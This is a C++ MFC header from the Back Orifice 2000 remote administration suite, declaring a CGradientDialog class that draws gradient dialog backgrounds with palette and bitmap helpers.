/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#if !defined(AFX_CGRADIENTDIALOG_H__DF6EFCC3_AA89_11D2_ADC4_0000F8084273__INCLUDED_)
#define AFX_CGRADIENTDIALOG_H__DF6EFCC3_AA89_11D2_ADC4_0000F8084273__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// CGradientDialog.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CGradientDialog dialog

class CGradientDialog : public CDialog
{
// Construction
public:
	void SetGradient();
	void SetGradient(COLORREF c1, COLORREF c2, int dir);

	CGradientDialog();
	CGradientDialog(UINT uResource, CWnd* pParent=NULL);
	CGradientDialog(LPCTSTR pszResource, CWnd* pParent=NULL);
	virtual ~CGradientDialog();
private:
	void CommonConstruct();
	BOOL CreateGradPalette();
	void CreateGradientBitmap(void);
	
// Dialog Data
	//{{AFX_DATA(CGradientDialog)
		// NOTE: the ClassWizard will add data members here
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CGradientDialog)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

	
// Implementation
protected:
	BOOL		m_bGradient;
	COLORREF	m_Color1,m_Color2;
	CBrush		m_HollowBrush;
	CPalette	m_Pal;
	COLORREF    m_PalVal[256];
	DWORD		*m_pGradBits;
	BITMAPINFO	m_biGradBitInfo;
    int			m_nNumColors;
	int			m_nDir;

	// Generated message map functions
	//{{AFX_MSG(CGradientDialog)
	afx_msg HBRUSH OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor);
	afx_msg BOOL OnEraseBkgnd(CDC* pDC);
	afx_msg BOOL OnQueryNewPalette();
	afx_msg void OnPaletteChanged(CWnd *pFocusWnd);
	afx_msg void OnRButtonDown(UINT nFlags, CPoint point);
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_CGRADIENTDIALOG_H__DF6EFCC3_AA89_11D2_ADC4_0000F8084273__INCLUDED_)







